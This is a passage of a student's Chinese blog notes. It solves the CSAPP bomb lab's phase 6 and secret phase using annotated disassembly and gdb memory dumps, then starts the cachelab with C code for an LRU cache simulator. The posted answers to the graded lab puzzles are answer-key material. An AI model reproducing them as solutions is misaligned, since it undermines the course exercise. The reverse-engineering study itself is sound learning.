$0x6032d0,%edx;这个0x6032d0一看就很奇怪,咋突然冒出来,肯定是条件,然后发现她是链表头指针直接x/24 0x6032d0就列出所有链表了</span><br><span class="line">  0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)搬运节点到另一个位置</span><br><span class="line">  0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">  0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">  0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">  0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx;</span><br><span class="line">  0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">  0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">  0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">  0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">  0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">  ;对节点保存顺序的要求</span><br><span class="line">  0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx</span><br><span class="line">  0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">  0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi</span><br><span class="line">  0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">  0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">  0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx);rcx是下面的节点,rdx是上面的节点,rcx+8就是下面的节点的next地址,就是反转链表,其实不是反转,只是把链表根据权重搬迁过去后,把next重排序</span><br><span class="line">;;  他妈的卧槽反转链表,妈的,有理由推断出要进行遍历</span><br><span class="line">  ;struct node&#123;</span><br><span class="line">;  int val  //4</span><br><span class="line"> ; int steps  //4</span><br><span class="line">  ;node*next  //8</span><br><span class="line"> ; &#125;</span><br><span class="line">  0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">  0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">  0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">  0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">  0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">  ;实现了一个链表结构</span><br><span class="line">  0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)</span><br><span class="line">  0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">  0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax;rbx+8的值给到rax</span><br><span class="line">  0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">  0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx);所以是上面的数要小一点</span><br><span class="line">  0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;;要大于等于,不然爆炸</span><br><span class="line">  0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">  0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx;再往上找下一个数字</span><br><span class="line">  0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">  0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">  0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br></pre></td></tr></table></figure>

<p>找出了题目给的的数组(结构体的值)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) p 0x0000014c</span><br><span class="line">$7 = 332   2</span><br><span class="line">(gdb) p  0x000000a8</span><br><span class="line">$8 = 168   1</span><br><span class="line">(gdb) p  0x0000039c</span><br><span class="line">$9 = 924   6</span><br><span class="line">(gdb) p 0x000002b3</span><br><span class="line">$10 = 691      5</span><br><span class="line">(gdb) p 0x000001dd</span><br><span class="line">$11 = 477   4</span><br><span class="line">(gdb) p  0x000001bb</span><br><span class="line">$12 = 443   3</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>小于等于:降序</p>
<p>得到数据: 3 4 5 6 1 2</p>
<p>然后再把它恢复到7-int之前则是 4 3 2 1 6 5</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071305646.jpg"></p>
<p>注意这个链表,发现他有三个值,一个是val,一个是order,一个是指向下一个的指针,例如node1.next&#x3D;&#x3D;&gt;node2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="type">int</span> order;</span><br><span class="line">    <span class="type">int</span> *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>所以捋顺一遍思路</p>
<ol>
<li>通过双层循环,判断6个数是[1,6]中的,并且各不相同</li>
<li>对六个数字取7的补,得到a1,b1,c1,d1,e1,f1</li>
<li>再根据取补后的数字,搬迁链表,把他按一个新的顺序排列</li>
<li>之后程序会对新的链表旅顺,让他能够遍历</li>
<li>判断下面的数都大于上面的数</li>
</ol>
<p>第3点是第五点的关键,我们知道链表一开始的排列,要把它安排成从上往下增大的形式,所以我们第一个要把924对应的node3丢过去,有规律可知,当a1&#x3D;3时会找到node3,把他搬迁过去,以此类推知道了a1-f1的顺序分别是3 4 5 6 1 2</p>
<p>再取补就可得到原数组 4 3 2 1 6 5</p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>在网上看了看发现了,这是phase_defused的反汇编函数,然后看他有一个secret_phase的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:	48 83 ec 78          	sub    $0x78,%rsp</span><br><span class="line">  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:	00 00 </span><br><span class="line">  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:	31 c0                	xor    %eax,%eax</span><br><span class="line">  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:	be 19 26 40 00       	mov    $0x402619,%esi; &quot;%d %d %s&quot;</span><br><span class="line">  4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi;经过尝试发现和phase_4的寄存器地址时一样的</span><br><span class="line">  4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">  401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  #char *0x402622=&quot;DrEvil&quot;</span><br><span class="line">  401604:	be 22 26 40 00       	mov    $0x402622,%esi</span><br><span class="line">  401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:	85 c0                	test   %eax,%eax</span><br><span class="line">  401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  #Curses, you&#x27;ve found the secret phase!</span><br><span class="line">  401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">  40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  #But finding it and solving it are quite different...</span><br><span class="line">  401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">  401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:	bf 58 25 40 00       	mov    $0x402558,%edi</span><br><span class="line">  40163a:	e8 d1 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax</span><br><span class="line">  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  40164b:	00 00 </span><br><span class="line">  40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:	48 83 c4 78          	add    $0x78,%rsp</span><br><span class="line">  401658:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>我们通过defuse_phase知道了secret的调用并且猜到了其中一个s密码,现在要找剩下的两个%d,然后发现他调用的寄存器时phase_4的,所以他们用的是同一个输入,我们直接在答案7 0 后面加一个 DrEvil ,这样就成功的进入这个secret_phase了  </p>
<p>secret_phase</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;;调用函数</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  ;</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax;eax--</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax//eax的值 ; [1,1001]</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  </span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi;esi中存了</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi;传一个值36进去</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>这里面strtol的函数原型是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">long</span> <span class="type">int</span> <span class="title">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str,<span class="type">char</span> **endptr,<span class="type">int</span> base)</span><span class="comment">//分别是rdi,rsi,rdx</span></span></span><br></pre></td></tr></table></figure>

<p>这里面edx&#x3D;10,所以strtol会对一串字符串读取其中的前面一段连续数字,然后转化成十进制</p>
<p>在根据10,11行可得知eax内的值&lt;&#x3D;1000</p>
<p>分析可知,fun_7的返回值必须得是2才能通过</p>
<p>fun_7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">;esi=999     *(edi)=36</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  #if(ptr==NULL)return -1</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi;所以rdi的值为0就结束了,不能为0</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;//不能跳转,跳转就爆了</span><br><span class="line">  #int val =*ptr;</span><br><span class="line">  # if(val-num&lt;=0)goto fun7_28</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;;递归调用</span><br><span class="line"> # ptr=*(ptr+8)</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  # int retval=2*fun7(ptr,num)</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax</span><br><span class="line">  # goto fun7_57   return retval</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  ---</span><br><span class="line">  fun7_28</span><br><span class="line">  #retval =0</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  #if(val==num)goto fun7_57  return 0</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;;相等就跳转</span><br><span class="line">  # ptr=*(ptr+0x10);//ptr2</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi;</span><br><span class="line">  # retval=2*fun7_(ptr,num)+1</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt;;递归调用</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  #goto fun7_57</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  #fun7_57</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq   </span><br><span class="line">  ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我直接挑一个地方让esi的值等于edi的值不就好了,应为fun7函数里面esi的值不变,涉及到esi的只有比较,所以我找个地方,把rax整成2,然后找到那个时候的edi的值就行了</p>
<p>输入命令,发现是一个链表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:  0x0000000000000024      0x0000000000603110</span><br><span class="line">0x603100 &lt;n1+16&gt;:       0x0000000000603130      0x0000000000000000</span><br><span class="line">0x603110 &lt;n21&gt;: 0x0000000000000008      0x0000000000603190</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x0000000000603150      0x0000000000000000</span><br><span class="line">0x603130 &lt;n22&gt;: 0x0000000000000032      0x0000000000603170</span><br><span class="line">0x603140 &lt;n22+16&gt;:      0x00000000006031b0      0x0000000000000000</span><br><span class="line">0x603150 &lt;n32&gt;: 0x0000000000000016      0x0000000000603270</span><br><span class="line">0x603160 &lt;n32+16&gt;:      0x0000000000603230      0x0000000000000000</span><br><span class="line">0x603170 &lt;n33&gt;: 0x000000000000002d      0x00000000006031d0</span><br><span class="line">0x603180 &lt;n33+16&gt;:      0x0000000000603290      0x0000000000000000</span><br><span class="line">0x603190 &lt;n31&gt;: 0x0000000000000006      0x00000000006031f0</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:      0x0000000000603250      0x0000000000000000</span><br><span class="line">0x6031b0 &lt;n34&gt;: 0x000000000000006b      0x0000000000603210</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:      0x00000000006032b0      0x0000000000000000</span><br><span class="line">0x6031d0 &lt;n45&gt;: 0x0000000000000028      0x0000000000000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6031f0 &lt;n41&gt;: 0x0000000000000001      0x0000000000000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603210 &lt;n47&gt;: 0x0000000000000063      0x0000000000000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603230 &lt;n44&gt;: 0x0000000000000023      0x0000000000000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603250 &lt;n42&gt;: 0x0000000000000007      0x0000000000000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603270 &lt;n43&gt;: 0x0000000000000014      0x0000000000000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603290 &lt;n46&gt;: 0x000000000000002f      0x0000000000000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6032b0 &lt;n48&gt;: 0x00000000000003e9      0x0000000000000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>



<p>大家通过代码的翻译,能梳理出以下几点</p>
<p>目的:这个递归是对链表的递归,每一个节点都有两个指针,所以每个节点都对应着另外两个节点,我们把这个节点根据指针的顺序画出一颗树,把指针1放左边,指针二放右边,得到如下一张图.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071305660.jpg"></p>
<p>注:左下是指针一的节点,右边&#x3D;下是指针2的节点</p>
<p>然后梳理一遍代码规则(val为节点的值,num为输入的数字)</p>
<ol>
<li>若val&lt;num ,走右边的节点,return 时的返回值要*2+1</li>
<li>若val&gt;num,走左边的节点,return 时的返回值要*2</li>
<li>若val&#x3D;num,return 0</li>
</ol>
<p>然后我们一步一步的令num&#x3D;every val,把return的值算出来,确定是2的情况就好了</p>
<p>答案:0x14 和 0x16</p>
<h2 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h2><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071308029.jpg"></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab5-cachelab</title>
    <url>/CSAPP/lab5/2024/03/10/</url>
    <content><![CDATA[<blockquote>
<p>前前后后看了一个星期的关于optimization programmer 和cache 方面的知识,虽然没有打开课本,但想直接做做,课本属实有点厚,主要是想快刀斩乱麻</p>
<p>太难啦!!!!</p>
</blockquote>
<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="Rules-and-Tips"><a href="#Rules-and-Tips" class="headerlink" title="Rules and Tips"></a>Rules and Tips</h2><blockquote>
<p><a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">WriteUp</a>，本lab的规则与评分标准。<br><a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">书本内容及实验</a>，这个ppt其实非常好，回顾了书本上的内容，对实验部分也给予了一定的引导作用。<br><a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">分块技术</a>，CMU早年的一篇文章，配合Lab食用体验更佳。</p>
</blockquote>
<h2 id="小函数"><a href="#小函数" class="headerlink" title="小函数"></a>小函数</h2><ul>
<li><p><a href="https://blog.csdn.net/afei__/article/details/81261879">getopt用法</a>,能在给定的命令参数中挑出选项,识别不同种类的参数</p>
</li>
<li><p><a href="https://www.cnblogs.com/yaya12138/p/11329319.html">fscanf用法</a>,能在包含大量相同格式的文件中,分别读出每一个字符</p>
</li>
</ul>
<p>函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Copyint <span class="title">fscanf</span><span class="params">(FILE * fp,<span class="type">char</span> * format,...)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中fp为文件指针，format为C字符串，…为参数列表，返回值为成功写入的字符的个数。</p>
<p>fscanf函数会从文件输入流中读入数据，存储到format中，<strong>遇到空格和换行时结束</strong>。</p>
<p>例如本文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fscanf</span>(fp, <span class="string">&quot;%c %xu,%d\n&quot;</span>, &amp;operation, &amp;address, &amp;size</span><br></pre></td></tr></table></figure>

<p>能从fp对应的文件中每一行读取一个字符存到operation,读取一个16进制无符号整数存到Address,读取一个整数存到Size</p>
<ul>
<li><a href="https://www.runoob.com/cprogramming/c-function-malloc.html">malloc用法</a>,能开辟空间</li>
</ul>
<p>函数声明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br></pre></td></tr></table></figure>

<p>返回值:</p>
<p>该函数返回一个指针,指向已分配大小的内存。如果请求失败,则返回NULL。</p>
<p>例如本文:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cache_ = (cache)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_f) * S);</span><br></pre></td></tr></table></figure>

<p>返回的指针无类型,需要自己规定类型.</p>
<ul>
<li><a href="https://www.runoob.com/cprogramming/c-function-fopen.html">fopen用法</a>: 定位文件(通过路径),以指针的形式访问文件</li>
</ul>
<p>函数声明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br></pre></td></tr></table></figure>

<p>例如本文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(t, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fuck you Open error!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cache寻址"><a href="#Cache寻址" class="headerlink" title="Cache寻址"></a>Cache寻址</h2><p>缓存长什么样?</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023552.png" alt="image-20240312163438221"></p>
<p>故缓存中的每个Cache_line由Valid_bits和Tag和Block构成,每个Set由有多个E,每个E有多个line.具体可以看视频,要是看不懂的话,可以看<a href="https://www.bilibili.com/video/BV1iW411d7hd?p=12">课程视频</a>.</p>
<p>相信你现在懂了,那我们再看看怎么寻址吧!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023597.png" alt="image-20240312163819510"></p>
<p>每一个内存对缓存的映射大都符合这种情况,有一个tag,有一个set index,有一个Block offset.了解了解就可以开始做题了!</p>
<p><strong>希望上面的每个链接你都能细致的看完,不然的话就要像我一样没有完备的知识架构体系而不断的上网查资料了,这就是精华!!!</strong></p>
<h1 id="Part-1-LRU-Cache"><a href="#Part-1-LRU-Cache" class="headerlink" title="Part 1 LRU Cache"></a>Part 1 LRU Cache</h1><p>目的:在给定的csim.c文件中编写填充,实现一个基于LRU策略的Cache simulator,该模拟器可以模拟在一系列的数据访问中cache的hit、miss与eviction的情况，其中，需要eviction行时，用LRU替换策略进行替换。</p>
<p>cache模拟器需要能处理一系列如下的命令：</p>
<pre><code>Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;
</code></pre>
<p>​    其中各参数意义如下：</p>
<ol>
<li><p>-h：输出帮助信息的选项；</p>
</li>
<li><p>-v：输出详细运行过程信息的选项；</p>
</li>
<li><p>-s：组索引的位数(意味着组数S&#x3D;2^s^)；</p>
</li>
<li><p>-E：每一组包含的行数；</p>
</li>
<li><p>-b：偏移位的宽度(意味着块的大小为B&#x3D;2^b^);</p>
</li>
<li><p>-t：输入数据文件的路径(测试数据从该文件里面读取)。</p>
</li>
</ol>
<p>———————————————</p>
<p><strong>接下来分别讲解每个函数的思路和代码实现:</strong></p>
<h2 id="sf"><a href="#sf" class="headerlink" title="sf"></a>sf</h2><p>在这个函数里面我要做的是把输入的,在命令行中的参数全部提取出来,这里采取的是getopt函数(注意加上他的头文件),要是你学会了他的用法那就不难了,opt会依次获取每一个选项<code>h,v,s,E,b,t</code>要是有就会读入,要是有冒号的话还会读入后面的参数,存在optarg中,通过atoi函数可以直接将字符串转换成整数!完美解决第一个小函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sf</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> ** argv)</span>&#123;</span><br><span class="line">    h = <span class="number">0</span>;</span><br><span class="line">    v = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="comment">// 拆分输入的规定</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                h = <span class="number">1</span>;</span><br><span class="line">                printUsage();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                v = <span class="number">1</span>;</span><br><span class="line">                printUsage();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">strcpy</span>(t, optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                printUsage();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &lt;= <span class="number">0</span> || E &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span> || t == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PrintUsage"><a href="#PrintUsage" class="headerlink" title="PrintUsage"></a>PrintUsage</h2><p>这个函数可要可不要,我随便写的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printUsage</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fuck you Vite ,Do it quickly ,Don&#x27;t play game! OK?\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Examples:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

